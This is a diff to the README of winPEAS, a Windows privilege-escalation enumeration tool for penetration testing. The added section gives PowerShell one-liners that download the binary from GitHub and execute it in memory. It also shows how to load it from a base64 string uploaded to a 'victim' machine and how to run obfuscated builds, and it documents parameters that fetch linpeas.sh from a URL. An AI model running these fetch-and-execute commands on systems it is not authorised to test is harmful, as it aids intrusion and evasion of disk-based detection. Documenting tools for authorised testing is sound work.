@@ -12,7 +12,47 @@ Check also the **Local Windows Privilege Escalation checklist** from **[book.hac
 
 **.Net >= 4.5 is required**
 
-Download the **[latest obfuscated version from here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases)** or **compile it yourself** (read instructions for compilation).
+Precompiled binaries:
+- Download the **[latest obfuscated version from here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/binanries/Obfuscated%20Releases)** or **compile it yourself** (read instructions for compilation).
+- Non-Obfuscated [winPEASany.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe)
+- Non-Obfuscated [winPEASx64.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe)
+- Non-Obfuscated [winPEASx86.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe)
+
+```bash
+#One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+#Before cmd in 3 lines
+$url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe"
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+#Load from disk in memory and execute:
+$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+#Load from disk in base64 and execute
+##Generate winpeas in Base64:
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("D:\Users\user\winPEAS.exe")) | Out-File -Encoding ASCII D:\Users\user\winPEAS.txt
+##Now upload the B64 string to the victim inside a file or copy it to the clipboard
+
+ ##If you have uploaded the B64 as afile load it with:
+$thecontent = Get-Content -Path D:\Users\victim\winPEAS.txt
+ ##If you have copied the B64 to the clipboard do:
+$thecontent = "aaaaaaaa..." #Where "aaa..." is the winpeas base64 string
+##Finally, load binary in memory and execute
+$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+#Loading from file and executing a winpeas obfuscated version
+##Load obfuscated version
+$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS-Obfuscated.exe")));
+$wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from "winPEAS.Program"
+[<ReflectedType_from_before>]::Main("") #Used the ReflectedType name to execute winpeas
+```
+
+## Parameters
+
 ```bash
 winpeas.exe #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
 winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
@@ -20,7 +60,8 @@ winpeas.exe notcolor #Do not color the output
 winpeas.exe wait #wait for user input between tests
 winpeas.exe debug #display additional debug information
 winpeas.exe log #log output to out.txt instead of standard output
-winpeas.exe -lolbas -linpeas=http://127.0.0.1/linpeas.sh #execute also additional LOLBAS search check and linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+winpeas.exe -lolbas  #Execute also additional LOLBAS search check 
 ```
 
 ## Basic information
@@ -215,6 +256,10 @@ If you want to help with any of this, you can do it using **[github issues](http
 If you find any issue, please report it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)**.
 
 **WinPEAS** is being **updated** every time I find something that could be useful to escalate privileges.
+
+## Please, if this tool has been useful for you consider to donate
+
+[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.patreon.com/peass)
 
 ## Advisory
 
